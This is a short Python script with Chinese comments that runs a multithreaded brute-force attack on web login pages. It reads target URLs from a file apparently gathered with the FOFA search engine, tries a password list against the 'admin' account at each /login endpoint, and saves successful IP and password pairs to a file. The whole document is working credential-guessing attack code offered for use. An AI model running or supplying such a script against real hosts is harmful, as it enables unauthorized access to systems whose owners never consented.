import requests 
import threading
from queue import Queue


#从host.txt中读取多个 IP 地址和端口号 

with open("fofa_url.txt","r")as f:
	urls=[line.strip() for line in f.readlines()]
#从pass.txt 中读取密码列表
with open("pass.txt","r") as f:
	passwords=[line.strip() for line in f.readlines()]
#构造 posT 请求的数据
data={"username":"admin"}
# 定义请求函数
def make_request(q):
	while not q.empty():
		url,password=q.get() 
		#ip,port=url.split(":")
		data["password"]=password
#发送POST 请求,并设置超时时间为3秒 
		try:
			response=requests.post(url+"/login",data=data,timeout=3) 
		except:
			continue

		if response.status_code ==200 and "true" in response.content.decode():
				print(f"Ip地址:{url},用户名:{data['username']},密码:{password},返回包长度:{len(response.content)}") 
				with open("restu.txt","a")as f:
					f.write(f"Ip地址:{url},用户名:{data['username']},密码:{password},返回包长度:{len(response.content)}\n")
# 创建线程池并启动线程 

threads=[]
q=Queue()
for url in urls:
	for password in passwords:
		q.put((url,password))

for i in range(3):
	t=threading.Thread(target=make_request,args=(q,)) 
	t.start()
threads.append(t)